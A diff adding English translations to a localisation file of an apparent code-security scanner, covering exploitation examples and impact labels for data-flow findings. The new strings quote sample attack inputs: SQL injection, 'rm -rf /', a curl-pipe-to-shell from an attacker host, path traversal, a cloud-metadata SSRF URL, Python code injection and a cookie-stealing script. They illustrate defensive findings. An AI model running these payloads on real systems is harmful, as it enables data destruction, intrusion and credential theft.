@@ -333,6 +333,40 @@ export const EN: Record<string, string> = {
     "Data-flow analysis traced a secret or credential from where it is read to where it is exposed — a log, an HTTP response, or an outbound request — with no masking or hashing along the way. Secrets in logs and responses leak to log storage and third parties.",
   "Не выводите секреты в логи и ответы. Маскируйте значение, логируйте только идентификатор, храните секреты в защищённом хранилище.":
     "Do not write secrets to logs or responses. Mask the value, log only an identifier, and keep secrets in a secure store.",
+  // Per-flow exploitation examples and impact (data-flow findings)
+  "Ввод «' OR '1'='1' -- » превращает условие в всегда-истинное и выдаёт все строки; «'; DROP TABLE users; --» разрушает данные.":
+    "Input \"' OR '1'='1' -- \" turns the condition always-true and returns every row; \"'; DROP TABLE users; --\" destroys data.",
+  "Ввод «; rm -rf / » или «$(curl attacker/x|sh)» выполняет произвольные команды ОС.":
+    "Input \"; rm -rf / \" or \"$(curl attacker/x|sh)\" runs arbitrary OS commands.",
+  "Ввод «../../../../etc/passwd» выходит за пределы каталога и читает системные файлы.":
+    "Input \"../../../../etc/passwd\" escapes the directory and reads system files.",
+  "Ввод «http://169.254.169.254/latest/meta-data/» заставляет сервер обратиться к метаданным облака.":
+    "Input \"http://169.254.169.254/latest/meta-data/\" makes the server reach cloud metadata.",
+  "Ввод «__import__('os').system('id')» исполняется как код приложения.":
+    "Input \"__import__('os').system('id')\" runs as application code.",
+  "Ввод «<script>fetch('//attacker/'+document.cookie)</script>» крадёт cookie в браузере жертвы.":
+    "Input \"<script>fetch('//attacker/'+document.cookie)</script>\" steals cookies in the victim's browser.",
+  "Ввод «https://evil.example» уводит пользователя на сайт злоумышленника для фишинга.":
+    "Input \"https://evil.example\" sends the user to an attacker site for phishing.",
+  "Значение секрета в логе или ответе видит каждый, у кого есть доступ к журналам, их системе сбора или к трафику.":
+    "A secret's value in a log or response is visible to anyone with access to the logs, their collector, or the traffic.",
+  "Чтение любых данных из базы": "Reading any data from the database",
+  "Изменение или удаление данных": "Modifying or deleting data",
+  "Выполнение произвольных команд на сервере": "Arbitrary command execution on the server",
+  "Полная компрометация хоста": "Full host compromise",
+  "Чтение произвольных файлов": "Reading arbitrary files",
+  "Раскрытие конфигов, ключей и исходников": "Exposure of configs, keys and source",
+  "Доступ к внутренним сервисам": "Access to internal services",
+  "Кража облачных учётных данных": "Theft of cloud credentials",
+  "Обход сетевого периметра": "Bypassing the network perimeter",
+  "Выполнение произвольного кода": "Arbitrary code execution",
+  "Кража сессий и токенов": "Session and token theft",
+  "Действия от имени пользователя": "Actions on the user's behalf",
+  "Подмена содержимого страницы": "Page-content spoofing",
+  "Фишинг с доверенного домена": "Phishing from a trusted domain",
+  "Угон OAuth-редиректов": "OAuth redirect hijacking",
+  "Раскрытие паролей, токенов и ключей": "Exposure of passwords, tokens and keys",
+  "Утечка в хранилища логов и третьим лицам": "Leakage to log storage and third parties",
   "Пользовательские данные достигают опасного вызова": "User data reaches a dangerous call",
   "Анализ потока данных проследил значение от места, где в программу попадает пользовательский ввод, через присваивания переменных до опасного вызова — без экранирования или проверки по пути. Полный путь показан в разделе «Поток данных»; каждый шаг можно открыть в коде и проверить.":
     "Data-flow analysis traced a value from where user input enters the program, through variable assignments, to a dangerous call — with no escaping or validation along the way. The full path is shown under \"Data flow\"; open each step in the code to verify it.",
